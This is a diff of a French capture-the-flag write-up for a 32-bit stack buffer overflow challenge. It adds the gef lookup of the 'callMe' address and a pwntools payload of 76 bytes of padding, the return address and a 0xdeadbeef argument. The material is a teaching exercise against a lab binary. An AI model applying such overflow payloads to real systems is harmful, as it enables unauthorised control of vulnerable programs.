@@ -137,17 +137,33 @@ Le programme crash car il n'arrive pas à accèder à l'adresse que nous avons i
 
 ## Exploit
 
-PIE est désactivé nous pouvons donc utiliser cette addresse de `portalGun` :
+PIE est désactivé nous pouvons donc utiliser cette adresse de `portalGun` :
 
 ```console
-gef➤  info func portalGun
-All functions matching regular expression "portalGun":
+gef➤  info func callMe
+All functions matching regular expression "callMe":
 
 Non-debugging symbols:
-0x080486a5  portalGun
+0x080485c6  callMe
 ```
 
-Et ce [script](./exploit.py) nous permet d'envoyer notre payload à l'aide `pwntools` :
+Notre payload sera un padding de 76 bytes comme dans l'analyse dynamique, suivie de l'adresse de `callMe` vers laquelle on veut rediriger le programme, puis les arguments nécessaires (car les arguments sont transmis depuis la stack en 32 bits) :
+
+```python
+offset = 76
+callMe_addr = 0x080485c6
+
+payload = b"".join([
+    b"A"*offset,
+    p32(callMe_addr),
+    b"B"*4,
+    p32(0xdeadbeef),
+])
+```
+
+En testant localement le payload, on comprends aussi que c'est le deuxième argument passé à `callMe` qui doit être `0xdeadbeef`, on rajoute donc un padding de 4 bytes.
+
+Enfin, ce [script](./exploit.py) nous permet d'envoyer notre payload avec `pwntools` :
 
 ```console
 $ python3 exploit.py 
